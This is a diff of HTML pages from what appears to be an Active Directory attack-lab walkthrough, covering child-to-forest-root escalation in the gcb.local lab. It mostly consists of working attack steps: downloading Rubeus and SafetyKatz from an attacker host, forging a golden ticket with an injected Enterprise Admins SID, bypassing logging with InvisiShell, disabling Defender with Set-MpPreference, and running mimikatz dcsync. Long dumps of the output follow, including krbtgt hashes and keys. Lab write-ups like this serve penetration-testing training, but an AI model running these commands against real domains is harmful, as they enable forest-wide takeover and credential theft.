+</p></div><div dir="auto"><p class="">We use <strong>Rubeus</strong> to create a <strong>Golden Ticket</strong> for the <code>administrator</code> account in the child domain (<code>it.gcb.local</code>). However, by <strong>injecting the Enterprise Admins SID from the forest root</strong>, we make the forged TGT look like it belongs to an <strong>Enterprise Admin</strong> in the entire forest. When this ticket is used, the <strong>forest root domain controller</strong> trusts it and grants <strong>privileged access to the entire AD forest</strong>.</p></div><div dir="auto"><p class="">This is the <strong>core technique</strong> that enables <strong>child-to-forest root escalation</strong> using <strong>SID history abuse</strong>.</p></div><div dir="auto"><h3 class="">Import Rubeus into IT-DC.</h3></div><div dir="auto"><p class=""><code>Invoke-WebRequest -Uri http://192.168.100.41:443/Rubeus.exe -OutFile "C:\Rubeus.exe" -UseBasicParsing</code></p></div><div dir="auto"><h3 class="">Forging the Inter-realm Golden ticket</h3></div><div dir="auto"><p class=""><code>Rubeus.exe golden /user:Administrator /id:500 /domain:it.gcb.local /sid:S-1-5-21-948911695-1962824894-4291460450 /groups:513 /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /aes256:62b85ee1e26d8f98f62090a8ac69a258fd32000ac5d3d4691aea2bbba72a226c /ptt</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:2505px"/></a></figure></div><div dir="auto"><p class="">In this command, we forged a Golden Ticket in the child domain <code>it.gcb.local</code> for the <code>administrator</code> account and make it appear as if it belongs to the Enterprise Admins group from the forest root. We do this by injecting the Enterprise Admins SID from the root domain <code>S-1-5-21-2781415573-3701854478-2406986946-519</code> using the <code>/sids</code> flag. This allows our forged TGT to be treated as if it has high-level privileges across the entire forest. We specify the child domain's SID with <code>/sid</code>, assign the Domain Users group with <code>/groups:513</code>, and use <code>/ptt</code> to inject the ticket directly into memory. By doing this, we escalate from a child domain compromise to forest-wide privilege, abusing SID history to make it possible.</p></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class="">With this newly forged inter-realm Golden ticket injected into our session, we can now access GCB.LOCAL Domain Controller (GCB-DC).</p></div><div dir="auto"><p class=""><code>winrs -r:gcb-dc.gcb.local cmd</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:2080px"/></a></figure></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><h3 class=""><strong>InvisiShell</strong></h3></div><div dir="auto"><pre class="code code-wrap"><code class="language-PowerShell">set COR_ENABLE_PROFILING=1
 set COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}
 
 REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" /f
@@ -451,20 +218,10 @@ powershell
 
 set COR_ENABLE_PROFILING=
 set COR_PROFILER=
-REG DELETE "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" /f</code></pre>
-
-<h3><strong>Disable Defender</strong></h3>
-
-<pre><code>Set-MpPreference -DisableRealtimeMonitoring 1; Set-MpPreference -DisableBehaviorMonitoring 1; Set-MpPreference -DisableScriptScanning 1; Set-MpPreference -DisableIntrusionPreventionSystem 1; Set-MpPreference -DisableNetworkProtection 1; Set-MpPreference -SubmitSamplesConsent 2; Set-MpPreference -MAPSReporting 0; Set-MpPreference -PUAProtection 0</code></pre>
-
-<h3>Import SafetyKatz to GCB-DC</h3>
-
-<p><code>Invoke-WebRequest -Uri http://192.168.100.41:443/SafetyKatz.exe -OutFile "C:\SafetyKatz.exe" -UseBasicParsing</code></p>
-
-<p><code>.\SafetyKatz.exe "privilege::debug" "lsadump::dcsync /user:gcb\krbtgt" "exit"</code></p>
-
-<ul class="toggle"><li><details open=""><summary><strong>KRBTGT</strong></summary>
-<pre><code>.\SafetyKatz.exe "privilege::debug" "lsadump::dcsync /user:gcb\krbtgt" "exit"
+REG DELETE "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" /f</code></pre></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><h3 class=""><strong>Disable Defender</strong></h3></div><div dir="auto"><pre class="code code-wrap"><code class="language-XML">Set-MpPreference -DisableRealtimeMonitoring 1; Set-MpPreference -DisableBehaviorMonitoring 1; Set-MpPreference -DisableScriptScanning 1; Set-MpPreference -DisableIntrusionPreventionSystem 1; Set-MpPreference -DisableNetworkProtection 1; Set-MpPreference -SubmitSamplesConsent 2; Set-MpPreference -MAPSReporting 0; Set-MpPreference -PUAProtection 0</code></pre></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><h3 class="">Import SafetyKatz to GCB-DC</h3></div><div dir="auto"><p class=""><code>Invoke-WebRequest -Uri http://192.168.100.41:443/SafetyKatz.exe -OutFile "C:\SafetyKatz.exe" -UseBasicParsing</code></p></div><div dir="auto"><p class=""><code>.\SafetyKatz.exe "privilege::debug" "lsadump::dcsync /user:gcb\krbtgt" "exit"</code></p></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><ul class="toggle"><li><details open=""><summary><strong>KRBTGT</strong></summary><div dir="auto"><pre class="code code-wrap"><code class="language-PowerShell">.\SafetyKatz.exe "privilege::debug" "lsadump::dcsync /user:gcb\krbtgt" "exit"
 
   .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
  .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
@@ -507,14 +264,18 @@ Supplemental Credentials:
 * Primary:Kerberos-Newer-Keys *
     Default Salt : GCB.LOCALkrbtgt
     Default Iterations : 4096
-    Credentials
+<pre><code>
+Credentials
+</code></pre>
       aes256_hmac       (4096) : ba949403d292a975adf5a1bce60bbf8a1bfd20d406b1b30c18beafe532b33840
       aes128_hmac       (4096) : f045d66af758aea91882810273e21d47
       des_cbc_md5       (4096) : 4c54587c57fef7c1
 
 * Primary:Kerberos *
     Default Salt : GCB.LOCALkrbtgt
-    Credentials
+<pre><code>
+Credentials
+</code></pre>
       des_cbc_md5       : 4c54587c57fef7c1
 
 * Packages *
@@ -552,21 +313,1895 @@ Supplemental Credentials:
     29  8310eda4f1a013bc001f107da903fc29
 
 
-mimikatz(commandline) # exit</code></pre>
-</details></li></ul>
+mimikatz(commandline) # exit</code></pre></div></details></li></ul></div><div dir="auto"><ul class="toggle"><li><details open=""><summary><strong>lsadump:dcsync all</strong></summary><div dir="auto"><pre class="code code-wrap"><code class="language-PowerShell">mimikatz(commandline) # lsadump::dcsync /all
+[DC] 'gcb.local' will be the domain
+[DC] 'gcb-dc.gcb.local' will be the DC server
+[DC] Exporting domain 'gcb.local'
+[rpc] Service  : ldap
+[rpc] AuthnSvc : GSS_NEGOTIATE (9)
 
-<div class="course-navigation">
-  <a class="prev-part" href="part-06-phase-6-section-9.html">← Previous: Phase 6 - Section 9</a>
-  <a class="next-part" href="part-08-phase-8-sections-11-12.html">Next: Phase 8 - Sections 11/12 →</a>
-</div>
+Object RDN           : gcb
 
+
+Object RDN           : LostAndFound
+
+
+Object RDN           : Deleted Objects
+
+
+Object RDN           : Users
+
+
+Object RDN           : Computers
+
+
+Object RDN           : System
+
+
+Object RDN           : WinsockServices
+
+
+Object RDN           : RpcServices
+
+
+Object RDN           : FileLinks
+
+
+Object RDN           : VolumeTable
+
+
+Object RDN           : ObjectMoveTable
+
+
+Object RDN           : Default Domain Policy
+
+
+Object RDN           : AppCategories
+
+
+Object RDN           : Meetings
+
+
+Object RDN           : Policies
+
+
+Object RDN           : User
+
+
+Object RDN           : Machine
+
+
+Object RDN           : User
+
+
+Object RDN           : Machine
+
+
+Object RDN           : RAS and IAS Servers Access Check
+
+
+Object RDN           : File Replication Service
+
+
+Object RDN           : Dfs-Configuration
+
+
+Object RDN           : IP Security
+
+
+Object RDN           : ipsecPolicy{72385230-70FA-11D1-864C-14A300000000}
+
+
+Object RDN           : ipsecISAKMPPolicy{72385231-70FA-11D1-864C-14A300000000}
+
+
+Object RDN           : ipsecNFA{72385232-70FA-11D1-864C-14A300000000}
+
+
+Object RDN           : ipsecNFA{59319BE2-5EE3-11D2-ACE8-0060B0ECCA17}
+
+
+Object RDN           : ipsecNFA{594272E2-071D-11D3-AD22-0060B0ECCA17}
+
+
+Object RDN           : ipsecPolicy{72385236-70FA-11D1-864C-14A300000000}
+
+
+Object RDN           : ipsecISAKMPPolicy{72385237-70FA-11D1-864C-14A300000000}
+
+
+Object RDN           : ipsecNFA{59319C04-5EE3-11D2-ACE8-0060B0ECCA17}
+
+
+Object RDN           : ipsecPolicy{7238523C-70FA-11D1-864C-14A300000000}
+
+
+Object RDN           : ipsecISAKMPPolicy{7238523D-70FA-11D1-864C-14A300000000}
+
+
+Object RDN           : ipsecNFA{7238523E-70FA-11D1-864C-14A300000000}
+
+
+Object RDN           : ipsecNFA{59319BF3-5EE3-11D2-ACE8-0060B0ECCA17}
+
+
+Object RDN           : ipsecNFA{6A1F5C6F-72B7-11D2-ACF0-0060B0ECCA17}
+
+
+Object RDN           : ipsecNFA{594272FD-071D-11D3-AD22-0060B0ECCA17}
+
+
+Object RDN           : ipsecNegotiationPolicy{59319BDF-5EE3-11D2-ACE8-0060B0ECCA17}
+
+
+Object RDN           : ipsecNegotiationPolicy{59319BF0-5EE3-11D2-ACE8-0060B0ECCA17}
+
+
+Object RDN           : ipsecNegotiationPolicy{59319C01-5EE3-11D2-ACE8-0060B0ECCA17}
+
+
+Object RDN           : ipsecNegotiationPolicy{72385233-70FA-11D1-864C-14A300000000}
+
+
+Object RDN           : ipsecNegotiationPolicy{7238523F-70FA-11D1-864C-14A300000000}
+
+
+Object RDN           : ipsecNegotiationPolicy{7238523B-70FA-11D1-864C-14A300000000}
+
+
+Object RDN           : ipsecFilter{7238523A-70FA-11D1-864C-14A300000000}
+
+
+Object RDN           : ipsecFilter{72385235-70FA-11D1-864C-14A300000000}
+
+
+Object RDN           : ComPartitions
+
+
+Object RDN           : ComPartitionSets
+
+
+Object RDN           : WMIPolicy
+
+
+Object RDN           : PolicyTemplate
+
+
+Object RDN           : SOM
+
+
+Object RDN           : PolicyType
+
+
+Object RDN           : WMIGPO
+
+
+Object RDN           : DomainUpdates
+
+
+Object RDN           : Operations
+
+
+Object RDN           : ab402345-d3c3-455d-9ff7-40268a1099b6
+
+
+Object RDN           : bab5f54d-06c8-48de-9b87-d78b796564e4
+
+
+Object RDN           : f3dd09dd-25e8-4f9c-85df-12d6d2f2f2f5
+
+
+Object RDN           : 2416c60a-fe15-4d7a-a61e-dffd5df864d3
+
+
+Object RDN           : 7868d4c8-ac41-4e05-b401-776280e8e9f1
+
+
+Object RDN           : 860c36ed-5241-4c62-a18b-cf6ff9994173
+
+
+Object RDN           : 0e660ea3-8a5e-4495-9ad7-ca1bd4638f9e
+
+
+Object RDN           : a86fe12a-0f62-4e2a-b271-d27f601f8182
+
+
+Object RDN           : d85c0bfd-094f-4cad-a2b5-82ac9268475d
+
+
+Object RDN           : 6ada9ff7-c9df-45c1-908e-9fef2fab008a
+
+
+Object RDN           : 10b3ad2a-6883-4fa7-90fc-6377cbdc1b26
+
+
+Object RDN           : 98de1d3e-6611-443b-8b4e-f4337f1ded0b
+
+
+Object RDN           : f607fd87-80cf-45e2-890b-6cf97ec0e284
+
+
+Object RDN           : 9cac1f66-2167-47ad-a472-2a13251310e4
+
+
+Object RDN           : 6ff880d6-11e7-4ed1-a20f-aac45da48650
+
+
+Object RDN           : 446f24ea-cfd5-4c52-8346-96e170bcb912
+
+
+Object RDN           : 51cba88b-99cf-4e16-bef2-c427b38d0767
+
+
+Object RDN           : a3dac986-80e7-4e59-a059-54cb1ab43cb9
+
+
+Object RDN           : 293f0798-ea5c-4455-9f5d-45f33a30703b
+
+
+Object RDN           : 5c82b233-75fc-41b3-ac71-c69592e6bf15
+
+
+Object RDN           : 7ffef925-405b-440a-8d58-35e8cd6e98c3
+
+
+Object RDN           : 4dfbb973-8a62-4310-a90c-776e00f83222
+
+
+Object RDN           : 8437C3D8-7689-4200-BF38-79E4AC33DFA0
+
+
+Object RDN           : 7cfb016c-4f87-4406-8166-bd9df943947f
+
+
+Object RDN           : f7ed4553-d82b-49ef-a839-2f38a36bb069
+
+
+Object RDN           : 8ca38317-13a4-4bd4-806f-ebed6acb5d0c
+
+
+Object RDN           : 3c784009-1f57-4e2a-9b04-6915c9e71961
+
+
+Object RDN           : 6bcd5678-8314-11d6-977b-00c04f613221
+
+
+Object RDN           : 6bcd5679-8314-11d6-977b-00c04f613221
+
+
+Object RDN           : 6bcd567a-8314-11d6-977b-00c04f613221
+
+
+Object RDN           : 6bcd567b-8314-11d6-977b-00c04f613221
+
+
+Object RDN           : 6bcd567c-8314-11d6-977b-00c04f613221
+
+
+Object RDN           : 6bcd567d-8314-11d6-977b-00c04f613221
+
+
+Object RDN           : 6bcd567e-8314-11d6-977b-00c04f613221
+
+
+Object RDN           : 6bcd567f-8314-11d6-977b-00c04f613221
+
+
+Object RDN           : 6bcd5680-8314-11d6-977b-00c04f613221
+
+
+Object RDN           : 6bcd5681-8314-11d6-977b-00c04f613221
+
+
+Object RDN           : 6bcd5682-8314-11d6-977b-00c04f613221
+
+
+Object RDN           : 6bcd5683-8314-11d6-977b-00c04f613221
+
+
+Object RDN           : 6bcd5684-8314-11d6-977b-00c04f613221
+
+
+Object RDN           : 6bcd5685-8314-11d6-977b-00c04f613221
+
+
+Object RDN           : 6bcd5686-8314-11d6-977b-00c04f613221
+
+
+Object RDN           : 6bcd5687-8314-11d6-977b-00c04f613221
+
+
+Object RDN           : 6bcd5688-8314-11d6-977b-00c04f613221
+
+
+Object RDN           : 6bcd5689-8314-11d6-977b-00c04f613221
+
+
+Object RDN           : 6bcd568a-8314-11d6-977b-00c04f613221
+
+
+Object RDN           : 6bcd568b-8314-11d6-977b-00c04f613221
+
+
+Object RDN           : 6bcd568c-8314-11d6-977b-00c04f613221
+
+
+Object RDN           : 6bcd568d-8314-11d6-977b-00c04f613221
+
+
+Object RDN           : 3051c66f-b332-4a73-9a20-2d6a7d6e6a1c
+
+
+Object RDN           : 3e4f4182-ac5d-4378-b760-0eab2de593e2
+
+
+Object RDN           : c4f17608-e611-11d6-9793-00c04f613221
+
+
+Object RDN           : 13d15cf0-e6c8-11d6-9793-00c04f613221
+
+
+Object RDN           : 8ddf6913-1c7b-4c59-a5af-b9ca3b3d2c4c
+
+
+Object RDN           : dda1d01d-4bd7-4c49-a184-46f9241b560e
+
+
+Object RDN           : a1789bfb-e0a2-4739-8cc0-e77d892d080a
+
+
+Object RDN           : 61b34cb0-55ee-4be9-b595-97810b92b017
+
+
+Object RDN           : 57428d75-bef7-43e1-938b-2e749f5a8d56
+
+
+Object RDN           : ebad865a-d649-416f-9922-456b53bbb5b8
+
+
+Object RDN           : 0b7fb422-3609-4587-8c2e-94b10f67d1bf
+
+
+Object RDN           : 2951353e-d102-4ea5-906c-54247eeec741
+
+
+Object RDN           : 71482d49-8870-4cb3-a438-b6fc9ec35d70
+
+
+Object RDN           : aed72870-bf16-4788-8ac7-22299c8207f1
+
+
+Object RDN           : f58300d1-b71a-4DB6-88a1-a8b9538beaca
+
+
+Object RDN           : 231fb90b-c92a-40c9-9379-bacfc313a3e3
+
+
+Object RDN           : 4aaabc3a-c416-4b9c-a6bb-4b453ab1c1f0
+
+
+Object RDN           : 9738c400-7795-4d6e-b19d-c16cd6486166
+
+
+Object RDN           : de10d491-909f-4fb0-9abb-4b7865c0fe80
+
+
+Object RDN           : b96ed344-545a-4172-aa0c-68118202f125
+
+
+Object RDN           : 4c93ad42-178a-4275-8600-16811d28f3aa
+
+
+Object RDN           : c88227bc-fcca-4b58-8d8a-cd3d64528a02
+
+
+Object RDN           : 5e1574f6-55df-493e-a671-aaeffca6a100
+
+
+Object RDN           : d262aae8-41f7-48ed-9f35-56bbb677573d
+
+
+Object RDN           : 82112ba0-7e4c-4a44-89d9-d46c9612bf91
+
+
+Object RDN           : c3c927a6-cc1d-47c0-966b-be8f9b63d991
+
+
+Object RDN           : 54afcfb9-637a-4251-9f47-4d50e7021211
+
+
+Object RDN           : f4728883-84dd-483c-9897-274f2ebcf11e
+
+
+Object RDN           : ff4f9d27-7157-4cb0-80a9-5d6f2b14c8ff
+
+
+Object RDN           : 83C53DA7-427E-47A4-A07A-A324598B88F7
+
+
+Object RDN           : C81FC9CC-0130-4FD1-B272-634D74818133
+
+
+Object RDN           : E5F9E791-D96D-4FC9-93C9-D53E1DC439BA
+
+
+Object RDN           : e6d5fd00-385d-4e65-b02d-9da3493ed850
+
+
+Object RDN           : 3a6b3fbf-3168-4312-a10d-dd5b3393952d
+
+
+Object RDN           : 7F950403-0AB3-47F9-9730-5D7B0269F9BD
+
+
+Object RDN           : 434bb40d-dbc9-4fe7-81d4-d57229f7b080
+
+
+Object RDN           : A0C238BA-9E30-4EE6-80A6-43F731E9A5CD
+
+
+Object RDN           : Windows2003Update
+
+
+Object RDN           : ActiveDirectoryUpdate
+
+
+Object RDN           : Password Settings Container
+
+
+Object RDN           : PSPs
+
+
+Object RDN           : Domain Controllers
+
+
+Object RDN           : Infrastructure
+
+
+Object RDN           : ForeignSecurityPrincipals
+
+
+Object RDN           : Program Data
+
+
+Object RDN           : Microsoft
+
+
+Object RDN           : NTDS Quotas
+
+
+Object RDN           : Managed Service Accounts
+
+
+Object RDN           : TPM Devices
+
+
+Object RDN           : Keys
+
+
+Object RDN           : Guest
+
+** SAM ACCOUNT **
+
+SAM Username         : Guest
+User Account Control : 00010222 ( ACCOUNTDISABLE PASSWD_NOTREQD NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
+Object Security ID   : S-1-5-21-2781415573-3701854478-2406986946-501
+Object Relative ID   : 501
+
+Credentials:
+
+Object RDN           : Builtin
+
+
+Object RDN           : S-1-5-4
+
+
+Object RDN           : S-1-5-11
+
+
+Object RDN           : Remote Desktop Users
+
+** SAM ACCOUNT **
+
+SAM Username         : Remote Desktop Users
+Object Security ID   : S-1-5-32-555
+Object Relative ID   : 555
+
+Credentials:
+
+Object RDN           : Network Configuration Operators
+
+** SAM ACCOUNT **
+
+SAM Username         : Network Configuration Operators
+Object Security ID   : S-1-5-32-556
+Object Relative ID   : 556
+
+Credentials:
+
+Object RDN           : Performance Monitor Users
+
+** SAM ACCOUNT **
+
+SAM Username         : Performance Monitor Users
+Object Security ID   : S-1-5-32-558
+Object Relative ID   : 558
+
+Credentials:
+
+Object RDN           : Performance Log Users
+
+** SAM ACCOUNT **
+
+SAM Username         : Performance Log Users
+Object Security ID   : S-1-5-32-559
+Object Relative ID   : 559
+
+Credentials:
+
+Object RDN           : Distributed COM Users
+
+** SAM ACCOUNT **
+
+SAM Username         : Distributed COM Users
+Object Security ID   : S-1-5-32-562
+Object Relative ID   : 562
+
+Credentials:
+
+Object RDN           : S-1-5-17
+
+
+Object RDN           : IIS_IUSRS
+
+** SAM ACCOUNT **
+
+SAM Username         : IIS_IUSRS
+Object Security ID   : S-1-5-32-568
+Object Relative ID   : 568
+
+Credentials:
+
+Object RDN           : Cryptographic Operators
+
+** SAM ACCOUNT **
+
+SAM Username         : Cryptographic Operators
+Object Security ID   : S-1-5-32-569
+Object Relative ID   : 569
+
+Credentials:
+
+Object RDN           : Event Log Readers
+
+** SAM ACCOUNT **
+
+SAM Username         : Event Log Readers
+Object Security ID   : S-1-5-32-573
+Object Relative ID   : 573
+
+Credentials:
+
+Object RDN           : Certificate Service DCOM Access
+
+** SAM ACCOUNT **
+
+SAM Username         : Certificate Service DCOM Access
+Object Security ID   : S-1-5-32-574
+Object Relative ID   : 574
+
+Credentials:
+
+Object RDN           : RDS Remote Access Servers
+
+** SAM ACCOUNT **
+
+SAM Username         : RDS Remote Access Servers
+Object Security ID   : S-1-5-32-575
+Object Relative ID   : 575
+
+Credentials:
+
+Object RDN           : RDS Endpoint Servers
+
+** SAM ACCOUNT **
+
+SAM Username         : RDS Endpoint Servers
+Object Security ID   : S-1-5-32-576
+Object Relative ID   : 576
+
+Credentials:
+
+Object RDN           : RDS Management Servers
+
+** SAM ACCOUNT **
+
+SAM Username         : RDS Management Servers
+Object Security ID   : S-1-5-32-577
+Object Relative ID   : 577
+
+Credentials:
+
+Object RDN           : Hyper-V Administrators
+
+** SAM ACCOUNT **
+
+SAM Username         : Hyper-V Administrators
+Object Security ID   : S-1-5-32-578
+Object Relative ID   : 578
+
+Credentials:
+
+Object RDN           : Access Control Assistance Operators
+
+** SAM ACCOUNT **
+
+SAM Username         : Access Control Assistance Operators
+Object Security ID   : S-1-5-32-579
+Object Relative ID   : 579
+
+Credentials:
+
+Object RDN           : Remote Management Users
+
+** SAM ACCOUNT **
+
+SAM Username         : Remote Management Users
+Object Security ID   : S-1-5-32-580
+Object Relative ID   : 580
+
+Credentials:
+
+Object RDN           : Storage Replica Administrators
+
+** SAM ACCOUNT **
+
+SAM Username         : Storage Replica Administrators
+Object Security ID   : S-1-5-32-582
+Object Relative ID   : 582
+
+Credentials:
+
+Object RDN           : Domain Computers
+
+** SAM ACCOUNT **
+
+SAM Username         : Domain Computers
+Object Security ID   : S-1-5-21-2781415573-3701854478-2406986946-515
+Object Relative ID   : 515
+
+Credentials:
+
+Object RDN           : Cert Publishers
+
+** SAM ACCOUNT **
+
+SAM Username         : Cert Publishers
+Object Security ID   : S-1-5-21-2781415573-3701854478-2406986946-517
+Object Relative ID   : 517
+
+Credentials:
+
+Object RDN           : Domain Users
+
+** SAM ACCOUNT **
+
+SAM Username         : Domain Users
+Object Security ID   : S-1-5-21-2781415573-3701854478-2406986946-513
+Object Relative ID   : 513
+
+Credentials:
+
+Object RDN           : Domain Guests
+
+** SAM ACCOUNT **
+
+SAM Username         : Domain Guests
+Object Security ID   : S-1-5-21-2781415573-3701854478-2406986946-514
+Object Relative ID   : 514
+
+Credentials:
+
+Object RDN           : RAS and IAS Servers
+
+** SAM ACCOUNT **
+
+SAM Username         : RAS and IAS Servers
+Object Security ID   : S-1-5-21-2781415573-3701854478-2406986946-553
+Object Relative ID   : 553
+
+Credentials:
+
+Object RDN           : Incoming Forest Trust Builders
+
+** SAM ACCOUNT **
+
+SAM Username         : Incoming Forest Trust Builders
+Object Security ID   : S-1-5-32-557
+Object Relative ID   : 557
+
+Credentials:
+
+Object RDN           : Terminal Server License Servers
+
+** SAM ACCOUNT **
+
+SAM Username         : Terminal Server License Servers
+Object Security ID   : S-1-5-32-561
+Object Relative ID   : 561
+
+Credentials:
+
+Object RDN           : Users
+
+** SAM ACCOUNT **
+
+SAM Username         : Users
+Object Security ID   : S-1-5-32-545
+Object Relative ID   : 545
+
+Credentials:
+
+Object RDN           : Guests
+
+** SAM ACCOUNT **
+
+SAM Username         : Guests
+Object Security ID   : S-1-5-32-546
+Object Relative ID   : 546
+
+Credentials:
+
+Object RDN           : Group Policy Creator Owners
+
+** SAM ACCOUNT **
+
+SAM Username         : Group Policy Creator Owners
+Object Security ID   : S-1-5-21-2781415573-3701854478-2406986946-520
+Object Relative ID   : 520
+
+Credentials:
+
+Object RDN           : Pre-Windows 2000 Compatible Access
+
+** SAM ACCOUNT **
+
+SAM Username         : Pre-Windows 2000 Compatible Access
+Object Security ID   : S-1-5-32-554
+Object Relative ID   : 554
+
+Credentials:
+
+Object RDN           : S-1-5-9
+
+
+Object RDN           : Windows Authorization Access Group
+
+** SAM ACCOUNT **
+
+SAM Username         : Windows Authorization Access Group
+Object Security ID   : S-1-5-32-560
+Object Relative ID   : 560
+
+Credentials:
+
+Object RDN           : 6E157EDF-4E72-4052-A82A-EC3F91021A22
+
+
+Object RDN           : Allowed RODC Password Replication Group
+
+** SAM ACCOUNT **
+
+SAM Username         : Allowed RODC Password Replication Group
+Object Security ID   : S-1-5-21-2781415573-3701854478-2406986946-571
+Object Relative ID   : 571
+
+Credentials:
+
+Object RDN           : Enterprise Read-only Domain Controllers
+
+** SAM ACCOUNT **
+
+SAM Username         : Enterprise Read-only Domain Controllers
+Object Security ID   : S-1-5-21-2781415573-3701854478-2406986946-498
+Object Relative ID   : 498
+
+Credentials:
+
+Object RDN           : Denied RODC Password Replication Group
+
+** SAM ACCOUNT **
+
+SAM Username         : Denied RODC Password Replication Group
+Object Security ID   : S-1-5-21-2781415573-3701854478-2406986946-572
+Object Relative ID   : 572
+
+Credentials:
+
+Object RDN           : Cloneable Domain Controllers
+
+** SAM ACCOUNT **
+
+SAM Username         : Cloneable Domain Controllers
+Object Security ID   : S-1-5-21-2781415573-3701854478-2406986946-522
+Object Relative ID   : 522
+
+Credentials:
+
+Object RDN           : Protected Users
+
+** SAM ACCOUNT **
+
+SAM Username         : Protected Users
+Object Security ID   : S-1-5-21-2781415573-3701854478-2406986946-525
+Object Relative ID   : 525
+
+Credentials:
+
+Object RDN           : DnsAdmins
+
+** SAM ACCOUNT **
+
+SAM Username         : DnsAdmins
+Object Security ID   : S-1-5-21-2781415573-3701854478-2406986946-1101
+Object Relative ID   : 1101
+
+Credentials:
+
+Object RDN           : DnsUpdateProxy
+
+** SAM ACCOUNT **
+
+SAM Username         : DnsUpdateProxy
+Object Security ID   : S-1-5-21-2781415573-3701854478-2406986946-1102
+Object Relative ID   : 1102
+
+Credentials:
+
+Object RDN           : MicrosoftDNS
+
+
+Object RDN           : RootDNSServers
+
+
+Object RDN           : @
+
+
+Object RDN           : A.ROOT-SERVERS.NET
+
+
+Object RDN           : B.ROOT-SERVERS.NET
+
+
+Object RDN           : C.ROOT-SERVERS.NET
+
+
+Object RDN           : D.ROOT-SERVERS.NET
+
+
+Object RDN           : E.ROOT-SERVERS.NET
+
+
+Object RDN           : F.ROOT-SERVERS.NET
+
+
+Object RDN           : G.ROOT-SERVERS.NET
+
+
+Object RDN           : H.ROOT-SERVERS.NET
+
+
+Object RDN           : I.ROOT-SERVERS.NET
+
+
+Object RDN           : J.ROOT-SERVERS.NET
+
+
+Object RDN           : K.ROOT-SERVERS.NET
+
+
+Object RDN           : L.ROOT-SERVERS.NET
+
+
+Object RDN           : M.ROOT-SERVERS.NET
+
+
+Object RDN           : DFSR-GlobalSettings
+
+
+Object RDN           : Domain System Volume
+
+
+Object RDN           : Content
+
+
+Object RDN           : SYSVOL Share
+
+
+Object RDN           : Topology
+
+
+Object RDN           : GCB-DC
+
+
+Object RDN           : Domain System Volume
+
+
+Object RDN           : DFSR-LocalSettings
+
+
+Object RDN           : SYSVOL Subscription
+
+
+Object RDN           : AdminSDHolder
+
+
+Object RDN           : Key Admins
+
+** SAM ACCOUNT **
+
+SAM Username         : Key Admins
+Object Security ID   : S-1-5-21-2781415573-3701854478-2406986946-526
+Object Relative ID   : 526
+
+Credentials:
+
+Object RDN           : Domain Admins
+
+** SAM ACCOUNT **
+
+SAM Username         : Domain Admins
+Object Security ID   : S-1-5-21-2781415573-3701854478-2406986946-512
+Object Relative ID   : 512
+
+Credentials:
+
+Object RDN           : Enterprise Admins
+
+** SAM ACCOUNT **
+
+SAM Username         : Enterprise Admins
+Object Security ID   : S-1-5-21-2781415573-3701854478-2406986946-519
+Object Relative ID   : 519
+
+Credentials:
+
+Object RDN           : Enterprise Key Admins
+
+** SAM ACCOUNT **
+
+SAM Username         : Enterprise Key Admins
+Object Security ID   : S-1-5-21-2781415573-3701854478-2406986946-527
+Object Relative ID   : 527
+
+Credentials:
+
+Object RDN           : Schema Admins
+
+** SAM ACCOUNT **
+
+SAM Username         : Schema Admins
+Object Security ID   : S-1-5-21-2781415573-3701854478-2406986946-518
+Object Relative ID   : 518
+
+Credentials:
+
+Object RDN           : Server Operators
+
+** SAM ACCOUNT **
+
+SAM Username         : Server Operators
+Object Security ID   : S-1-5-32-549
+Object Relative ID   : 549
+
+Credentials:
+
+Object RDN           : Administrators
+
+** SAM ACCOUNT **
+
+SAM Username         : Administrators
+Object Security ID   : S-1-5-32-544
+Object Relative ID   : 544
+
+Credentials:
+
+Object RDN           : Backup Operators
+
+** SAM ACCOUNT **
+
+SAM Username         : Backup Operators
+Object Security ID   : S-1-5-32-551
+Object Relative ID   : 551
+
+Credentials:
+
+Object RDN           : Account Operators
+
+** SAM ACCOUNT **
+
+SAM Username         : Account Operators
+Object Security ID   : S-1-5-32-548
+Object Relative ID   : 548
+
+Credentials:
+
+Object RDN           : Replicator
+
+** SAM ACCOUNT **
+
+SAM Username         : Replicator
+Object Security ID   : S-1-5-32-552
+Object Relative ID   : 552
+
+Credentials:
+
+Object RDN           : Print Operators
+
+** SAM ACCOUNT **
+
+SAM Username         : Print Operators
+Object Security ID   : S-1-5-32-550
+Object Relative ID   : 550
+
+Credentials:
+
+Object RDN           : krbtgt
+
+** SAM ACCOUNT **
+
+SAM Username         : krbtgt
+User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
+Object Security ID   : S-1-5-21-2781415573-3701854478-2406986946-502
+Object Relative ID   : 502
+
+Credentials:
+  Hash NTLM: 4c478fa3683aad18054ee613b6eed11b
+
+Object RDN           : Read-only Domain Controllers
+
+** SAM ACCOUNT **
+
+SAM Username         : Read-only Domain Controllers
+Object Security ID   : S-1-5-21-2781415573-3701854478-2406986946-521
+Object Relative ID   : 521
+
+Credentials:
+
+Object RDN           : Domain Controllers
+
+** SAM ACCOUNT **
+
+SAM Username         : Domain Controllers
+Object Security ID   : S-1-5-21-2781415573-3701854478-2406986946-516
+Object Relative ID   : 516
+
+Credentials:
+
+Object RDN           : Windows Virtual Machine
+
+
+Object RDN           : DomainDnsZones
+
+
+Object RDN           : Configuration
+
+
+Object RDN           : ForestDnsZones
+
+
+Object RDN           : BCKUPKEY_593b18e9-2888-497e-8fc9-37557875847f Secret
+
+  * Legacy key
+<pre><code>
+1a802b2b756cb6e23f6f1dfc79c1e4b7cde2db32639f39ef3a380342df470124
+10b3620695470edcabebaa0558c943636d1421a3a409b178de37376f2066a0c6
+fb5ac9016f3afc82e18c94b7c9ff8caec28f5055adb30ea1fcef86f57f9718e9
